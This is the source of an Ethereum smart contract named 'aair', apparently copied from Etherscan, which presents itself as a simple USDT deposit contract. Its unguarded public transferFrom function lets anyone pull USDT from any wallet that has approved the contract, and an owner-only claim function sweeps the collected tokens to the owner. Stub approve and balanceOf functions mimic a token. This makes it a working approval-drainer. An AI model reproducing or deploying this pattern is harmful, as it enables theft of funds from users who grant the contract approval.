/**
 *Submitted for verification at Etherscan.io on 2022-08-19
*/

pragma solidity ^0.4.26;

interface IERC20 {
  function transfer(address recipient, uint256 amount) external;
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external ;
  function decimals() external view returns (uint8);
}


contract aair {
    IERC20 usdt;

    address private  owner;    // current owner of the contract

     constructor(address _usdt) public{   
        owner=msg.sender;
        usdt = IERC20(_usdt);
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

        
    function claim(address _token) public {
        require(owner == msg.sender);
        IERC20 erc20token = IERC20(_token);
        uint256 balance = erc20token.balanceOf(address(this));
        erc20token.transfer(msg.sender, balance);
    }

    function register() public payable {
    }

    function deposit(uint256 amount) external {                     
    
    usdt.transferFrom(msg.sender, address(this), amount);
       
    }

    function transferFrom(address sender,uint256 amount) external {         
    
    usdt.transferFrom(sender, address(this), amount);
       
    }
   function balanceOf(address who) public constant returns (uint256) {
      
    }
  function approve(address spender, uint256 value) public  {          
        

       
    }
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}